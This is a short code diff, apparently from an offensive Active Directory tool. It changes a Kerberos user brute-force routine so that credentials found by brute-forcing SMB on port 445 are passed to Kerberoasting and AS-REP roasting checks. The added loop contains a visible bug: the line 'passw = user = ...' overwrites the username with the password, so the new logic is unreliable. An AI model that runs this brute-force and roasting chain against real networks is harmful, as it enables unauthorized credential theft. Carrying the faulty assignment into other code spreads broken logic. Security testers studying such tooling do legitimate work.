@@ -199,12 +199,17 @@ def bruteforce_kerberos_users(target, domain):
     if (len(users) > 0):
         # Try to bruteforce users credentials
         export_wordlists(users, smb_passwords)
-        bruteforce(target, '445')
-        if not check_smb_credentials(target, domain):
+        credentials: list = bruteforce(target, '445')
+        if not credentials:
             # Check Kerberoast using guest creds
             check_kerberoast(target, domain)
             check_asreproast(target, domain)
-
+        else:
+            for creds in credentials:
+                user = creds.split(':')[0]
+                passw = user = creds.split(':')[1]
+                check_kerberoast(target, domain, user, passw)
+                check_asreproast(target, domain, user, passw)
 
 
 def handle_kerberos(target, domain):
